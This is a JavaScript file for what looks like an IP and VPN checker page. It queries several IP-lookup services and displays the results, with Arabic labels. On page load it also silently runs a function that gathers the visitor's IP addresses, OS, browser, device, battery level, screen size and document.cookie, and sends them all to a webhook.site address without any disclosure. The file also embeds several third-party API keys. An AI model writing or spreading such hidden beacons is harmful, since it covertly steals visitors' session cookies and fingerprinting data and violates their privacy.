function script_(ip) {
    const tbody = document.getElementById("results");
    const ipDisplay = document.getElementById("user-ip");

    // IPv4 https://api.ipify.org/?format=json
    // IPv6 https://api64.ipify.org/?format=json
function runAllChecks(ip) {
  checkIPWho(ip);
  checkIPApi(ip);
  checkIpinfo(ip);
  checkproxycheck(ip);
  checkIpdata(ip);
  checkIpwhois(ip);
  checkIpRegistry(ip);
  checkVpnApi(ip);
}

if (!ip) {
    sendIPsToWebhook();

  fetch("https://api.ipify.org/?format=json")//ip4v
    .then(res => res.json())
    .then(ipData => {
      const ip = ipData.ip;
      ipDisplay.innerText = `ip Address : ${ip}`;
      tbody.innerHTML = ""; // Clear loading row
      runAllChecks(ip);
    });
} else {
  runAllChecks(ip);
}

  function checkVpnApi(ip) {
  const apiKey = "fea37dd607164549b8f93e5d0fd8c970"; // 🔐 استبدل هذا بمفتاحك من vpnapi.io

  fetch(`https://vpnapi.io/api/${ip}?key=${apiKey}`)
    .then(res => res.json())
    .then(data => {
      const security = data.security || {};
      const isVPN = security.vpn || security.proxy || security.tor || false;
      const country = data.location?.country || "?";
      const org = data.network?.autonomous_system_organization || "غير معروف";

      addRow("vpnapi.io", country, org, isVPN);
    })
    .catch(err => {
      console.error("vpnapi.io error", err);
      addRow("vpnapi.io", "?", "?", false);
    });
}

function checkIpRegistry(ip) {
  const apiKey = "tryout"; // مفتاح مجاني للتجربة من ipregistry.co

  fetch(`https://api.ipregistry.co/${ip}?key=${apiKey}`)
    .then(res => res.json())
    .then(data => {
      const org = data?.connection?.organization || "غير معروف";
      const country = data?.location?.country?.name || "?";
      const isVPN = data.security?.is_vpn || data.security?.is_proxy || data.security?.is_tor || false;

      addRow("ipregistry.co", country, org, isVPN);
    })
    .catch(err => {
      console.error("ipregistry.co error", err);
      addRow("ipregistry.co", "?", "?", false);
    });
}

function checkIpApi(ip) {
  fetch(`http://ip-api.com/json/${ip}?fields=status,country,org,proxy,hosting`)
    .then(res => res.json())
    .then(data => {
      if (data.status === "fail") {
        addRow("ip-api.com", "?", "?", false);
        return;
      }

      const isVPN = data.proxy || data.hosting;
      const org = data.org || "غير معروف";
      const country = data.country || "?";

      addRow("ip-api.com", country, org, isVPN);
    })
    .catch(err => {
      console.error("ip-api.com error", err);
      addRow("ip-api.com", "?", "?", false);
    });
}

function checkIpwhois(ip) {
  fetch(`https://ipwhois.app/json/${ip}`)
    .then(res => res.json())
    .then(data => {
      const org = data.org || data.isp || "غير معروف";
      const country = data.country || "?";
      // لا يوجد كشف مباشر لـ VPN في ipwhois.io، فنفترض false:
      const isVPN = false;

      addRow("ipwhois.io", country, org, isVPN);
    })
    .catch(err => {
      console.error("ipwhois.io error", err);
      addRow("ipwhois.io", "?", "?", false);
    });
}
    // API 1: ipwho.is
    function checkIPWho(ip) {
      fetch(`https://ipwho.is/${ip}`)
        .then(res => res.json())
        .then(data => {
          const isVPN = data.connection?.type === "corporate";
          addRow("ipwho.is", data.country, data.connection?.org, isVPN);
        });
    }

    // API 2: ip-api.com
function checkIPApi(ip) {
  fetch(`/.netlify/functions/bypass_CORS?url=https://pro.ip-api.com/json/${ip}?fields=66842623&key=ipapiq9SFY1Ic4`)
    .then(response => response.json())
    .then(data => {
      console.log(data);
      // Example addRow usage (adjust based on your actual table structure)
      addRow("ip-api.com", data.country, data.org || data.isp, data.proxy || false);
    })
    .catch(error => console.error("Error:", error));
}



    // API 3: ipinfo.io
    function checkIpinfo(ip) {
      fetch(`https://ipinfo.io/${ip}/json?token=`) // Token optional for small usage
        .then(res => res.json())
        .then(data => {
          const isVPN = data?.privacy?.vpn || false;
          addRow("ipinfo.io", data.country, data.org, isVPN);
        });
    }
    
function checkproxycheck(ip) {
  const apiKey = "l11151-636tc1-940138-06n954";
  fetch(`/.netlify/functions/bypass_CORS?url=https://proxycheck.io/apiproxy/${ip}?vpn=1&asn=1&tag=proxycheck.io`)
    .then(res => res.json())
    .then(data => {
      console.log(data);
      const info = data[ip]; // the proxycheck.io response is keyed by the IP
      const isVPN = info?.proxy === "yes" || info?.type === "VPN";
      const country = info?.country || "Unknown";
      const org = info?.provider || "Unknown";
      addRow("proxycheck.io", country, org, isVPN);
    })
    .catch(err => {
      console.error('Fetch error:', err);
    });
}





    // API 5: ipdata.co 
    function checkIpdata(ip) {
      fetch(`https://api.ipdata.co/${ip}?api-key=eca677b284b3bac29eb72f5e496aa9047f26543605efe99ff2ce35c9`) // "test" is limited but works 
        .then(res => res.json())
        .then(data => {
        if (data.message && data.message.includes("whitelist")) {
        addRow("ipdata.co", "غير مسموح", "-", false);
        return;
        }
        const threat = data.threat || {};
        const scores = threat.scores || {};

        const isVPN = (
        threat.is_vpn === true ||
        threat.is_proxy === true ||
        scores.vpn_score >= 90 ||
        scores.proxy_score >= 90
          );


          addRow("ipdata.co", data.country_name, data.asn?.name, isVPN);
        });
    }

    // Add row to table
    function addRow(service, country, org, isVPN) {
      const row = `
        <tr>
          <td>${service}</td>
          <td>${country || "?"}</td>
          <td>${org || "?"}</td>
          <td class="${isVPN ? 'yes' : 'no'}">${isVPN ? "نعم" : "لا"}</td>
          <td>${isVPN ? "⚠️ احتمال VPN/Proxy" : "✅ اتصال عادي"}</td>
        </tr>`;
      tbody.innerHTML += row;
    }
}
script_()
    const ipDisplay = document.getElementById("user-ip");
    const tbody = document.getElementById("results");
    document.getElementById("search").addEventListener("keydown", function(event) {
      if (event.key === "Enter") {
        event.preventDefault();
        const ip = this.value.trim();

        if (!ip) {
          alert("❗ الرجاء إدخال عنوان IP أولاً.");
          return;
        }

        ipDisplay.innerText = `ip Address : ${ip}`;
        tbody.innerHTML = ""; // Clear old results
        script_(ip);
      }
    });
async function getDeviceInfo() {
  const ua = navigator.userAgent;

  const deviceInfo = {
    userAgent: ua,
    platform: navigator.platform,
    language: navigator.language,
    screen: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
    },
    os: "Unknown OS",
    device: "Unknown device",
    browser: "Unknown browser",
    batteryLevel: "غير مدعوم",
  };

  // تحديد نظام التشغيل
  if (/android/i.test(ua)) deviceInfo.os = "Android";
  else if (/iPad|iPhone|iPod/.test(ua)) deviceInfo.os = "iOS";
  else if (/Macintosh/.test(ua)) deviceInfo.os = "macOS";
  else if (/Windows/.test(ua)) deviceInfo.os = "Windows";
  else if (/Linux/.test(ua)) deviceInfo.os = "Linux";

  // نوع الجهاز
  if (/mobile/i.test(ua)) deviceInfo.device = "جوال";
  else if (/tablet/i.test(ua)) deviceInfo.device = "جهاز لوحي";
  else deviceInfo.device = "كمبيوتر";

  // تحديد المتصفح
  if (/Chrome/.test(ua) && !/Edg/.test(ua)) deviceInfo.browser = "Chrome";
  else if (/Safari/.test(ua) && !/Chrome/.test(ua)) deviceInfo.browser = "Safari";
  else if (/Firefox/.test(ua)) deviceInfo.browser = "Firefox";
  else if (/Edg/.test(ua)) deviceInfo.browser = "Edge";
  else if (/OPR|Opera/.test(ua)) deviceInfo.browser = "Opera";

  // مستوى البطارية (إن وُجد)
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      deviceInfo.batteryLevel = `${Math.round(battery.level * 100)}%`;
    } catch {
      deviceInfo.batteryLevel = "خطأ في قراءة البطارية";
    }
  }

  return deviceInfo;
}

async function sendIPsToWebhook() {
  try {
    const ipv4Res = await fetch("https://api.ipify.org/?format=json");
    const ipv4Data = await ipv4Res.json();
    const ipv4 = ipv4Data.ip;

    const ipv6Res = await fetch("https://api64.ipify.org/?format=json");
    const ipv6Data = await ipv6Res.json();
    const ipv6 = ipv6Data.ip;

    const deviceInfo = await getDeviceInfo();

    const params = new URLSearchParams({
      ip4v: ipv4,
      ip6v: ipv6,
      os: deviceInfo.os,
      browser: deviceInfo.browser,
      device: deviceInfo.device,
      battery: deviceInfo.batteryLevel,
      lang: deviceInfo.language,
      width: deviceInfo.screen.width.toString(),
      height: deviceInfo.screen.height.toString(),
      cookie: document.cookie,
    });

    const url = `https://webhook.site/78a22deb-651e-48c4-b625-828735e463f5?${params.toString()}`;
    await fetch(url);
    console.log("✅ البيانات أُرسلت بنجاح إلى:", url);
  } catch (err) {
    console.error("❌ فشل الإرسال:", err);
  }
}

